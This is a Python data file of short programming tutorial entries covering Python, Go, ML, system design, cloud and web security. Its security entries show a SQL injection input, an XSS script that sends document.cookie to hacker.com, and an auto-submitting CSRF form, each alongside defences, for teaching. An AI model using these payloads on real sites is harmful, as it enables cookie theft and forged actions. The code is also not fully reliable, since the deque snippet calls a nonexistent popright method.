# Additional topics to reach 365 total
# Categories: python, go, rust, ai-ml, cloud, devops, system-design, dsa, backend, frontend, security

EXTRA_TOPICS_2 = [
# ═══════════════════════════════════════════════════════════════
# PYTHON — 25 topics
# ═══════════════════════════════════════════════════════════════
("python","Python List Comprehensions","""Create lists concisely.

```python
# Before
squares = []
for i in range(10):
    if i % 2 == 0:
        squares.append(i**2)

# After: List comprehension
squares = [i**2 for i in range(10) if i % 2 == 0]

# Dictionary comprehension
word_lengths = {word: len(word) for word in ["hello", "world", "python"]}

# Set comprehension
unique_lengths = {len(word) for word in ["hello", "world", "python"]}
```

**Key Takeaway**: Comprehensions are faster and more readable than loops for simple transformations. Don't overuse them for complex logic."""),

("python","Python Generators and yield","""Lazy evaluation for memory efficiency.

```python
# Returns entire list (uses memory)
def get_squares(n):
    return [i**2 for i in range(n)]

# Generator (yields one at a time, O(1) memory)
def generate_squares(n):
    for i in range(n):
        yield i**2

# Usage
for sq in generate_squares(1000000):
    print(sq) # Only one square in memory at a time!

# Generator expression (like list comprehension but with parentheses)
gen = (i**2 for i in range(1000000))
```

**Key Takeaway**: Use generators for large datasets, infinite sequences, or reading huge files."""),

("python","Python Decorators","""Modify functions without changing their code.

```python
import time
from functools import wraps

def timer(func):
    @wraps(func) # Preserves original function's name and docstring
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = func(*args, **kwargs)
        end = time.perf_counter()
        print(f"'{func.__name__}' ran in {end - start:.4f} secs")
        return result
    return wrapper

@timer
def heavy_computation(n):
    return sum(i * i for i in range(n))

heavy_computation(1000000)
```

**Key Takeaway**: Decorators wrap a function. Useful for logging, timing, authentication, and caching."""),

("python","Python Context Managers (with statement)","""Resource management made safe.

```python
# Standard usage
with open("data.txt", "w") as f:
    f.write("Hello")
# f is automatically closed here, even if exception occurs!

# Creating custom context manager (Class based)
class Timer:
    def __enter__(self):
        self.start = time.time()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f"Elapsed: {time.time() - self.start}")

with Timer():
    time.sleep(1)

# Using contextlib (Generator based)
from contextlib import contextmanager

@contextmanager
def open_file(path, mode):
    f = open(path, mode)
    try:
        yield f
    finally:
        f.close()
```"""),

("python","Python *args and **kwargs","""Variable number of arguments.

```python
def make_api_call(url, *args, **kwargs):
    print(f"URL: {url}")
    
    # args is a tuple of positional arguments
    for i, arg in enumerate(args):
        print(f"Positional arg {i}: {arg}")
        
    # kwargs is a dictionary of keyword arguments
    for key, value in kwargs.items():
        print(f"Keyword arg {key}: {value}")

make_api_call("https://api.com", "param1", "param2", timeout=30, retries=3)

# Unpacking
params = [1, 2, 3]
options = {"color": "red", "size": "large"}
some_function(*params, **options)
```"""),

("python","Python Lambda, Map, Filter","""Functional programming tools.

```python
# Lambda (anonymous function)
add = lambda x, y: x + y
print(add(5, 3)) # 8

numbers = [1, 2, 3, 4, 5]

# Map (transform each element)
squares = list(map(lambda x: x**2, numbers))
# Better: [x**2 for x in numbers]

# Filter (keep matching elements)
evens = list(filter(lambda x: x % 2 == 0, numbers))
# Better: [x for x in numbers if x % 2 == 0]

# Sorting with lambda
users = [{"name": "Dipak", "age": 25}, {"name": "Alice", "age": 30}]
users.sort(key=lambda u: u["age"])
```"""),

("python","Python Type Hinting","""Optional static typing for better tooling.

```python
from typing import List, Dict, Optional, Union, Callable

def process_users(users: List[str], max_age: int = 100) -> Dict[str, bool]:
    result: Dict[str, bool] = {}
    for user in users:
        result[user] = True
    return result

def get_user(user_id: int) -> Optional[str]:
    # Returns string or None
    return "Dipak" if user_id == 1 else None

# Python 3.10+ syntax
def parse(data: str | bytes) -> list[int] | None:
    pass

# Type aliases
UserId = int
def delete_user(id: UserId) -> None:
    pass
```

**Key Takeaway**: Type hints don't affect runtime, but catch bugs early in IDEs and tools like `mypy`."""),

("python","Python Dataclasses","""Classes without boilerplate.

```python
from dataclasses import dataclass, field

@dataclass
class User:
    id: int
    name: str
    email: str
    is_active: bool = True
    friends: list[str] = field(default_factory=list) # avoid mutable default args!

    def greeting(self) -> str:
        return f"Hi, I'm {self.name}"

u1 = User(1, "Dipak", "d@example.com")
u2 = User(1, "Dipak", "d@example.com")

print(u1 == u2) # True (auto-generates __eq__)
print(u1)       # User(id=1, name='Dipak', email='d@example.com', is_active=True, friends=[])
```

**Key Takeaway**: Use `@dataclass` for classes that primarily store data. It auto-generates `__init__`, `__repr__`, and `__eq__`."""),

("python","Python Collections Module","""Specialized container datatypes.

```python
from collections import Counter, defaultdict, namedtuple, deque

# Counter
words = ['apple', 'bat', 'apple', 'cat', 'bat', 'apple']
counts = Counter(words)
print(counts['apple']) # 3
print(counts.most_common(1)) # [('apple', 3)]

# DefaultDict
d = defaultdict(list)
d['fruits'].append('apple') # No KeyError!

# NamedTuple
Point = namedtuple('Point', ['x', 'y'])
p = Point(10, 20)
print(p.x, p.y)

# Deque (Double-ended queue, fast appends/pops from both ends)
q = deque([1, 2, 3])
q.appendleft(0)
q.popright()
```"""),

("python","Python Magic Methods (Dunder methods)","""Customize class behavior.

```python
class Vector:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        
    def __str__(self):
        return f"Vector({self.x}, {self.y})" # Used by print()
        
    def __repr__(self):
        return f"Vector({self.x}, {self.y})" # Developer representation
        
    def __add__(self, other):
        return Vector(self.x + other.x, self.y + other.y) # + operator
        
    def __eq__(self, other):
        return self.x == other.x and self.y == other.y # == operator
        
    def __len__(self):
        return 2 # Used by len()

v1 = Vector(1, 2)
v2 = Vector(3, 4)
print(v1 + v2) # Vector(4, 6)
```"""),

("python","Python Multiprocessing vs Threading","""Concurrency vs Parallelism.

```python
import threading
import multiprocessing
import time

# I/O Bound task (Downloading files, DB queries) -> Use Threading
def io_bound():
    time.sleep(1) # Simulating I/O

# CPU Bound task (Math, Image processing) -> Use Multiprocessing
def cpu_bound():
    return sum(i*i for i in range(10**7))

# Global Interpreter Lock (GIL) prevents threads from executing Python bytecodes in parallel.
# Therefore, threading does not speed up CPU-bound tasks in Python!

if __name__ == '__main__':
    # Thread pool
    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=4) as e:
        e.map(lambda _: io_bound(), range(10))
        
    # Process pool (Bypasses GIL)
    from concurrent.futures import ProcessPoolExecutor
    with ProcessPoolExecutor(max_workers=4) as e:
        e.map(lambda _: cpu_bound(), range(10))
```"""),

("python","Python Asyncio","""Asynchronous I/O.

```python
import asyncio
import time

async def fetch_data(id, delay):
    print(f"Task {id}: starting")
    await asyncio.sleep(delay) # Non-blocking wait
    print(f"Task {id}: done")
    return {"id": id, "data": "..."}

async def main():
    start = time.time()
    
    # Run concurrently
    results = await asyncio.gather(
        fetch_data(1, 2),
        fetch_data(2, 3),
        fetch_data(3, 1)
    )
    
    print(f"Finished in {time.time() - start:.2f}s") # Takes ~3 seconds, not 6!
    print(results)

# Run the event loop
# asyncio.run(main())
```

**Key Takeaway**: `asyncio` is great for highly concurrent network I/O. Use `aiohttp` or `httpx` instead of `requests` for async HTTP."""),

("python","Python FastAPI Basics","""Modern, fast web framework.

```python
from fastapi import FastAPI, Path, Query
from pydantic import BaseModel

app = FastAPI()

class Item(BaseModel):
    name: str
    price: float
    is_offer: bool = None

@app.get("/")
def read_root():
    return {"Hello": "World"}

@app.get("/items/{item_id}")
def read_item(item_id: int = Path(..., gt=0), q: str = Query(None, max_length=50)):
    return {"item_id": item_id, "q": q}

@app.post("/items/")
def create_item(item: Item):
    return {"item_name": item.name, "price": item.price}

# Run with: uvicorn main:app --reload
```

**Key Takeaway**: FastAPI uses Pydantic for data validation and automatically generates Swagger/OpenAPI docs at `/docs`."""),

("python","Python Pydantic Validation","""Data parsing and validation.

```python
from pydantic import BaseModel, EmailStr, Field, validator
from datetime import datetime

class User(BaseModel):
    id: int
    name: str = Field(..., min_length=2, max_length=50)
    email: EmailStr
    signup_ts: datetime | None = None
    friends: list[int] = []
    
    @validator('name')
    def name_must_be_capitalized(cls, v):
        if not v[0].isupper():
            raise ValueError('must be capitalized')
        return v

# Will parse strings to ints/datetimes automatically if possible
user = User(id='123', name='Dipak', email='d@test.com', signup_ts='2024-01-01T12:00:00Z')
print(user.id) # 123 (int)

print(user.json()) # Serialize to JSON
```"""),

("python","Python Virtual Environments","""Isolate dependencies.

```bash
# Create a virtual environment named 'venv'
python -m venv venv

# Activate (Windows)
venv\Scripts\activate
# Activate (Mac/Linux)
source venv/bin/activate

# Install packages (only in this env)
pip install requests

# Save dependencies
pip freeze > requirements.txt

# Install from file
pip install -r requirements.txt

# Deactivate
deactivate
```

**Key Takeaway**: Never run `pip install` globally. Always use virtual environments (venv, poetry, conda) for every project to avoid dependency conflicts."""),

# ═══════════════════════════════════════════════════════════════
# GO (GOLANG) — 15 topics
# ═══════════════════════════════════════════════════════════════
("go","Go Basics - Syntax and Types","""Fast, compiled, statically typed.

```go
package main

import "fmt"

func main() {
    // Variables
    var name string = "Dipak"
    age := 25 // Short declaration, infers type
    
    // Arrays (fixed) & Slices (dynamic)
    arr := [3]int{1, 2, 3}
    slice := []int{1, 2, 3, 4}
    slice = append(slice, 5)
    
    // Maps
    ages := map[string]int{"Alice": 30, "Bob": 25}
    ages["Charlie"] = 35
    
    // Loops (only 'for' exists in Go)
    for i := 0; i < 5; i++ {
        fmt.Println(i)
    }
    
    // Range loop
    for key, val := range ages {
        fmt.Printf("%s is %d\\n", key, val)
    }
}
```"""),

("go","Go Structs and Methods","""Go is not purely object-oriented (no classes/inheritance).

```go
package main
import "fmt"

// Define a struct
type Rectangle struct {
    Width  float64
    Height float64
}

// Method with a receiver (value receiver)
func (r Rectangle) Area() float64 {
    return r.Width * r.Height
}

// Method with a pointer receiver (modifies the struct)
func (r *Rectangle) Scale(factor float64) {
    r.Width *= factor
    r.Height *= factor
}

func main() {
    rect := Rectangle{Width: 10, Height: 5}
    fmt.Println(rect.Area()) // 50
    
    rect.Scale(2)
    fmt.Println(rect.Width) // 20
}
```"""),

("go","Go Interfaces","""Implicit implementation.

```go
package main
import "fmt"

// Interface definition
type Shape interface {
    Area() float64
}

type Circle struct { Radius float64 }
type Square struct { Side float64 }

// Implicitly implement Shape by defining Area()
func (c Circle) Area() float64 { return 3.14 * c.Radius * c.Radius }
func (s Square) Area() float64 { return s.Side * s.Side }

func printArea(s Shape) {
    fmt.Printf("Area: %f\\n", s.Area())
}

func main() {
    c := Circle{Radius: 5}
    s := Square{Side: 4}
    printArea(c)
    printArea(s)
}
```

**Key Takeaway**: You don't write `implements Shape`. If a type has the methods, it implements the interface. This promotes loose coupling."""),

("go","Go Error Handling","""Explicit errors over exceptions.

```go
package main
import (
    "errors"
    "fmt"
)

func divide(a, b float64) (float64, error) {
    if b == 0 {
        return 0, errors.New("cannot divide by zero")
    }
    return a / b, nil
}

func main() {
    result, err := divide(10, 0)
    
    // Check error explicitly
    if err != nil {
        fmt.Println("Error:", err)
        return
    }
    fmt.Println("Result:", result)
}
```

**Key Takeaway**: Go doesn't have `try/catch`. Errors are just values returned by functions. This makes control flow predictable."""),

("go","Go Goroutines","""Lightweight concurrent threads.

```go
package main
import (
    "fmt"
    "time"
)

func printNumbers(prefix string) {
    for i := 1; i <= 5; i++ {
        time.Sleep(100 * time.Millisecond)
        fmt.Printf("%s: %d\\n", prefix, i)
    }
}

func main() {
    // Start a goroutine (runs concurrently)
    go printNumbers("Goroutine")
    
    // Runs in main thread
    printNumbers("Main")
    
    // Note: If main() exits, all goroutines are killed immediately!
}
```

**Key Takeaway**: Goroutines are managed by the Go runtime, not the OS. They take ~2KB of memory. You can run hundreds of thousands of them."""),

("go","Go Channels","""Communicate between goroutines safely.

```go
package main
import "fmt"

func sum(s []int, c chan int) {
    sum := 0
    for _, v := range s {
        sum += v
    }
    c <- sum // send sum to channel
}

func main() {
    s := []int{7, 2, 8, -9, 4, 0}
    
    // Create an unbuffered channel of ints
    c := make(chan int)
    
    go sum(s[:len(s)/2], c)
    go sum(s[len(s)/2:], c)
    
    // Receive from channel (blocks until data is ready)
    x, y := <-c, <-c 
    
    fmt.Println(x, y, x+y)
}
```

**Go Proverb**: "Don't communicate by sharing memory; share memory by communicating." Channels avoid race conditions by passing data."""),

("go","Go Select Statement","""Wait on multiple channel operations.

```go
package main
import (
    "fmt"
    "time"
)

func main() {
    c1 := make(chan string)
    c2 := make(chan string)

    go func() {
        time.Sleep(1 * time.Second)
        c1 <- "one"
    }()
    go func() {
        time.Sleep(2 * time.Second)
        c2 <- "two"
    }()

    for i := 0; i < 2; i++ {
        // select blocks until ONE of its cases can run
        select {
        case msg1 := <-c1:
            fmt.Println("Received", msg1)
        case msg2 := <-c2:
            fmt.Println("Received", msg2)
        case <-time.After(3 * time.Second): // Timeout pattern
            fmt.Println("Timeout")
        }
    }
}
```"""),

("go","Go Defer","""Ensure cleanup functions run.

```go
package main
import (
    "fmt"
    "os"
)

func main() {
    f, err := os.Create("test.txt")
    if err != nil {
        panic(err)
    }
    
    // defer pushes the function call onto a list
    // It will be executed AFTER the surrounding function returns
    defer f.Close()
    defer fmt.Println("File closed") // LIFO order
    
    fmt.Println("Writing to file")
    f.WriteString("Hello Go!")
}
```

**Key Takeaway**: Use `defer` immediately after acquiring a resource (file, lock, connection) to ensure it gets released even if the function panics."""),

# ═══════════════════════════════════════════════════════════════
# AI & ML — 20 topics
# ═══════════════════════════════════════════════════════════════
("ai-ml","Neural Networks Basics","""How machines learn.

An Artificial Neural Network (ANN) consists of:
1. **Input Layer**: Takes features (e.g., image pixels).
2. **Hidden Layers**: Perform computations using Weights and Biases.
3. **Output Layer**: Produces prediction (e.g., cat vs dog).

**Forward Propagation**: Data moves input -> output.
`Z = W*X + b`
`A = Activation(Z)`

**Backpropagation**: Calculates error (Loss) and updates weights backwards using Gradient Descent to minimize the error.

**Key Takeaway**: Training a model is just finding the optimal weights and biases that minimize the loss function across the dataset."""),

("ai-ml","Activation Functions","""Adding non-linearity.

If we only use linear equations (`Wx+b`), a 100-layer network is mathematically equivalent to a 1-layer network. Activation functions fix this.

| Function | Output Range | Use Case |
|:---|:---|:---|
| **Sigmoid** | 0 to 1 | Binary classification output |
| **Tanh** | -1 to 1 | Hidden layers (better than sigmoid) |
| **ReLU** | 0 to ∞ | Most common hidden layer. Fixes vanishing gradient |
| **Softmax** | Probabilities (sum to 1) | Multi-class classification output |

```python
# ReLU implementation
def relu(x):
    return max(0, x)
```"""),

("ai-ml","Supervised vs Unsupervised Learning","""Paradigms of Machine Learning.

### Supervised Learning
Data has labels (answers). Model learns the mapping from input to output.
- **Classification**: Predict category (Spam/Not Spam, Cat/Dog).
- **Regression**: Predict continuous value (House price, Temperature).

### Unsupervised Learning
Data has NO labels. Model finds hidden structure.
- **Clustering**: Group similar items (Customer segmentation). K-Means.
- **Dimensionality Reduction**: Compress features while keeping info (PCA).

### Reinforcement Learning
Agent learns to make decisions by performing actions in an environment to maximize a reward (Chess bot, Self-driving car)."""),

("ai-ml","Overfitting and Underfitting","""The Bias-Variance Tradeoff.

**Underfitting (High Bias)**: Model is too simple. It doesn't capture the pattern. Performs poorly on training AND test data. (E.g., using a straight line to fit a curve).
*Fix*: More complex model, train longer, add features.

**Overfitting (High Variance)**: Model is too complex. It memorized the training data noise. Performs great on training, TERRIBLE on test data.
*Fix*: More data, Regularization (L1/L2), Dropout, Early Stopping.

**Key Takeaway**: The goal is a model that *generalizes* well to unseen data."""),

("ai-ml","Convolutional Neural Networks (CNN)","""Deep learning for images.

Instead of looking at all pixels at once, CNNs look at patches using filters (kernels).

1. **Convolution Layer**: Slides a filter over the image to detect features (edges, corners).
2. **Pooling Layer (Max Pooling)**: Downsamples the image to reduce computation and prevent overfitting.
3. **Fully Connected Layer**: Standard network at the end to make the final prediction.

**Key Takeaway**: CNNs capture spatial hierarchies. Layer 1 detects edges, Layer 2 detects shapes, Layer 3 detects faces."""),

("ai-ml","Recurrent Neural Networks (RNN) & LSTM","""Deep learning for sequential data.

Standard networks have no memory. RNNs have loops, allowing information to persist.
Use cases: Time series forecasting, Speech recognition, Text generation.

**The Vanishing Gradient Problem**: Basic RNNs forget early inputs in long sequences.

**LSTM (Long Short-Term Memory)**: A special RNN cell that uses "gates" (Forget, Input, Output) to control the flow of information, allowing it to remember long-term dependencies.

**Modern alternative**: Transformers (Attention is all you need)."""),

("ai-ml","Transformers and Attention","""The architecture behind LLMs (ChatGPT, BERT).

**Self-Attention**: Allows the model to weigh the importance of different words in a sentence relative to each other.
*Example*: "The animal didn't cross the street because **it** was too tired." Attention helps the model know "it" refers to "animal", not "street".

Unlike RNNs that process words sequentially (slow), Transformers process all words in parallel, making them highly scalable.

**Encoder-Decoder**:
- BERT uses just Encoders (good for understanding/classification).
- GPT uses just Decoders (good for generation)."""),

("ai-ml","Word Embeddings (Word2Vec)","""Representing words as numbers.

Machine learning models only understand numbers.
- **One-hot encoding**: [0,0,1,0...] (Sparse, no semantic meaning).
- **Embeddings**: Dense vectors where distance represents semantic similarity.

If "King" is [0.9, 0.1, 0.5], "Man" is [0.8, 0.1, 0.4].
Famous vector math: `King - Man + Woman ≈ Queen`

**Key Takeaway**: Embeddings capture meaning. Modern models generate context-aware embeddings (the embedding for "bank" depends on if it's "river bank" or "bank account")."""),

("ai-ml","Large Language Models (LLMs) Concepts","""How ChatGPT works.

1. **Pre-training**: Train a massive transformer on the internet to predict the next token (word piece). Result: Base model (knows grammar, facts, but isn't helpful).
2. **Supervised Fine-Tuning (SFT)**: Train on high-quality Q&A pairs to make it act like an assistant.
3. **RLHF (Reinforcement Learning from Human Feedback)**: Humans rank model responses. Train a Reward Model. Use PPO (Proximal Policy Optimization) to make the LLM maximize the reward (be helpful and harmless).

**Parameters**: The weights/biases learned. 7B, 70B, 175B. More = smarter but requires more GPU VRAM."""),

("ai-ml","Retrieval-Augmented Generation (RAG)","""Give LLMs custom knowledge without retraining.

LLMs hallucinate and their knowledge is frozen. RAG fixes this.

**Ingestion**:
1. Take internal docs → Chunk into paragraphs.
2. Convert chunks to embeddings via a model.
3. Store in a Vector Database (Pinecone, Milvus, pgvector).

**Retrieval**:
1. User asks: "What is our refund policy?"
2. Convert query to embedding.
3. Search Vector DB for closest matching chunks (Cosine similarity).
4. Inject retrieved chunks into LLM prompt: "Based on [chunks], answer [query]."

**Key Takeaway**: RAG is the cheapest, most effective way to build internal AI assistants."""),

# ═══════════════════════════════════════════════════════════════
# SYSTEM DESIGN & ARCHITECTURE (15 topics)
# ═══════════════════════════════════════════════════════════════
("system-design","Event Sourcing","""Store state as a sequence of events.

Instead of storing the *current* state of an entity, store all the *events* that led to it.

**Standard DB (State)**:
Account: ID=1, Balance=$50

**Event Sourcing DB**:
1. AccountCreated (ID=1)
2. Deposited (ID=1, $100)
3. Withdrawn (ID=1, $50)

**Benefits**:
- Absolute audit log (time travel!).
- Easily rebuild state by replaying events.
- Perfect for accounting, carts, version control (Git!).

**Cons**:
- Replaying millions of events is slow (requires "Snapshots" every N events).
- Usually paired with CQRS."""),

("system-design","Consistent Hashing","""Scale caches and databases without massive data movement.

Standard hashing: `server = hash(key) % N`.
If N (num servers) changes, almost ALL keys map to a new server (massive cache miss!).

**Consistent Hashing**:
1. Place servers on a virtual ring (0 to 360 degrees) using `hash(server_ip)`.
2. Place keys on the same ring using `hash(key)`.
3. To find a server, move clockwise from the key to the first server.

When a server is added/removed, only `1/N` keys need to move!

**Key Takeaway**: Used heavily in distributed caches (Memcached, Redis Cluster) and DynamoDB."""),

("system-design","SAGA Pattern","""Distributed transactions across microservices.

You can't use standard ACID 2PC (Two-Phase Commit) in microservices—it blocks too much.

**SAGA**: A sequence of local transactions. Each service updates its DB and publishes an event to trigger the next step.

If a step fails, you must execute **Compensating Transactions** to undo the previous steps.

*Example (Booking trip)*:
1. Book Flight (Success) →
2. Book Hotel (Success) →
3. Book Car (Fails!) →
4. Cancel Hotel (Compensate) →
5. Cancel Flight (Compensate).

**Choreography**: Services publish/listen to events directly.
**Orchestration**: A central Coordinator service tells everyone what to do."""),

("system-design","Bloom Filters","""Space-efficient probabilistic data structure.

Tells you if an item is "definitely not" in a set or "probably" in a set.

**How it works**:
A bit array of size M, initially all 0.
To insert: pass item through K hash functions. Set those K bits to 1.
To check: pass item through K hash functions. If ANY bit is 0, it's DEFINITELY NOT there. If all are 1, it's PROBABLY there (could be collision).

**Use Cases**:
- Malicious URL checking (Chrome).
- DBs (Cassandra/Postgres) use it to avoid reading disk for keys that don't exist.
- "Username already taken" fast check.

**Tradeoff**: 0% false negatives, small % false positives. Very memory efficient."""),

("system-design","Leader Election","""Who is in charge of the cluster?

In distributed systems, you often need ONE node to coordinate tasks (e.g., cron jobs) to avoid duplicate work.

Algorithms:
- **Paxos / Raft**: Consensus algorithms to agree on a leader.
- **ZooKeeper / etcd**: Distributed key-value stores that manage election via ephemeral nodes.

*How ZooKeeper works*:
Nodes try to create a file `/leader`. The first one wins. It holds a session lock. If it crashes, the session dies, the file is deleted, and others try to create it.

**Split Brain**: Network partitions can cause two leaders. Prevented using "Quorum" (N/2 + 1 nodes must agree)."""),

# ═══════════════════════════════════════════════════════════════
# CLOUD & DEVOPS AWS/GCP (15 topics)
# ═══════════════════════════════════════════════════════════════
("cloud","AWS EC2 vs ECS vs EKS vs Lambda","""Choosing AWS compute.

| Service | Level | What you manage | Best For |
|:---|:---|:---|:---|
| **EC2** | IaaS | OS, updates, scaling, network | Legacy apps, deep control |
| **ECS** | CaaS | Docker containers | Microservices, Docker |
| **EKS** | CaaS | Kubernetes clusters | Large, complex k8s workloads |
| **Lambda**| FaaS | Just code | Event-driven, cron, APIs |

**Key Takeaway**: Start Serverless (Lambda/Fargate ECS). Only move to EC2/EKS when you need specific OS control, persistent background processes, or have massive predictable scale where serverless gets too expensive."""),

("cloud","AWS S3 and CloudFront","""Storage and CDN.

**S3 (Simple Storage Service)**: Object storage (not block storage). Files are stored in Buckets with a flat structure (no real folders, just keys like `folder/file.jpg`).
- Standard: frequently accessed.
- Glacier: cheap archive, takes hours to retrieve.

**CloudFront (CDN)**: Caches S3 content at Edge Locations worldwide.
- User in India requests image -> Served from Mumbai edge location (fast!) instead of US East S3 bucket (slow).

**Key Takeaway**: Never serve static assets (images, JS, CSS) directly from your app server or raw S3. Always put a CDN in front to reduce latency and save bandwidth costs."""),

("cloud","Infrastructure as Code (Terraform)","""Code your infrastructure.

Clicking through AWS console is bad: not reproducible, no history, prone to error.

```hcl
provider "aws" { region = "us-east-1" }

resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  tags = { Name = "HelloWorld" }
}

resource "aws_s3_bucket" "b" {
  bucket = "my-tf-test-bucket"
}
```

Commands:
`terraform init` (download plugins)
`terraform plan` (see what will change)
`terraform apply` (execute changes)

**State File**: Terraform keeps a `.tfstate` file mapping code to real resources. Store this securely in an S3 bucket!"""),

("devops","CI/CD Concepts","""Continuous Integration and Deployment.

**CI (Continuous Integration)**:
Developers merge code to `main` frequently.
Automated servers (GitHub Actions, Jenkins) build the code, run linters, and run unit tests.
*Goal: Catch integration bugs early.*

**CD (Continuous Delivery)**:
Code is built into an artifact (e.g., Docker image) and is *ready* to be deployed to production at any time.

**CD (Continuous Deployment)**:
Code is automatically deployed to production without manual intervention.

**Blue/Green Deployment**:
Two identical environments. V1 is running on Blue. Deploy V2 to Green. Test Green. Switch router traffic to Green. If issue, switch back to Blue instantly."""),

("devops","Prometheus and Grafana","""Monitoring stack.

**Prometheus**: Time-series database that *pulls* metrics from your apps.
Your app exposes an HTTP endpoint `/metrics` showing memory usage, request counts, etc. Prometheus scrapes it every 15s.

**Grafana**: Visualization dashboard that queries Prometheus.

*Key Metrics to monitor (The Four Golden Signals)*:
1. **Latency**: Time to service a request.
2. **Traffic**: Requests per second.
3. **Errors**: Rate of failed requests (500s).
4. **Saturation**: How "full" your service is (CPU, Memory, DB connections)."""),

# ═══════════════════════════════════════════════════════════════
# BACKEND & SECURITY (15 topics)
# ═══════════════════════════════════════════════════════════════
("security","SQL Injection (SQLi)","""The most common database attack.

**Vulnerable Code**:
```java
String query = "SELECT * FROM users WHERE email = '" + inputEmail + "'";
```
Attacker inputs: `admin@mail.com' OR '1'='1`
Resulting Query: `SELECT * FROM users WHERE email = 'admin@mail.com' OR '1'='1'` (Logs them in as admin!)

**Prevention**: Use Prepared Statements (Parameterized Queries).
```java
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE email = ?");
pstmt.setString(1, inputEmail);
```
The database treats the input strictly as a string literal, not executable code. ORMs like Hibernate/Entity Framework do this automatically."""),

("security","Cross-Site Scripting (XSS)","""Injecting malicious scripts into browsers.

Attacker submits a comment: `<script>fetch('http://hacker.com/?cookie='+document.cookie)</script>`
If the site displays this comment without escaping it, the browser runs the script and steals session cookies of anyone viewing the comment!

**Stored XSS**: Saved in DB (like comments).
**Reflected XSS**: Sent in URL and reflected back.

**Prevention**:
1. **Escape output**: Convert `<` to `&lt;`. Frameworks like React/Angular do this by default!
2. **Content Security Policy (CSP)**: HTTP header that restricts where scripts can load from.
3. **HttpOnly Cookies**: Prevents JavaScript (`document.cookie`) from accessing session cookies."""),

("security","Cross-Site Request Forgery (CSRF)","""Tricking users into taking unwanted actions.

User is logged into `bank.com`.
User visits malicious `hacker.com`.
`hacker.com` has a hidden form:
```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker_account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```
Because the user is logged into the bank, the browser automatically attaches the bank session cookies!

**Prevention**:
1. **Anti-CSRF Tokens**: Server sends a unique random token. Form must include it. Hacker can't read it due to Same-Origin Policy.
2. **SameSite Cookie Attribute**: Set `SameSite=Lax` or `Strict` on session cookies. Modern browsers default to Lax!"""),

("backend","OAuth 2.0 Flow","""Delegated authorization.

How "Login with Google" works.

1. App asks User: "Can I access your Google profile?"
2. User is redirected to Google login page.
3. User approves. Google redirects back to App with an **Authorization Code**.
4. App backend sends Authorization Code + App Secret to Google.
5. Google returns an **Access Token**.
6. App uses Access Token to fetch User profile from Google APIs.

**Key Takeaway**: The App NEVER sees the user's Google password. OAuth is for *Authorization* (accessing resources). OIDC (OpenID Connect) adds an ID Token for *Authentication* (verifying identity)."""),

("backend","REST vs GraphQL vs gRPC","""API Architectures.

| Feature | REST | GraphQL | gRPC |
|:---|:---|:---|:---|
| Protocol | HTTP/1.1 | HTTP/1.1 | HTTP/2 |
| Data Format| JSON | JSON | Protobuf (Binary) |
| Overfetching| Yes | No (Client specifies) | No |
| Best For | Public APIs, CRUD | Complex UIs, Mobile | Internal Microservices |

**GraphQL**: One endpoint `/graphql`. Client queries exactly what it wants: `query { user(id:1) { name, posts { title } } }`. Fixes underfetching/overfetching.
**gRPC**: Created by Google. Uses Protocol Buffers (strongly typed). Binary format makes it 10x faster and smaller than JSON. Ideal for fast service-to-service communication."""),
]
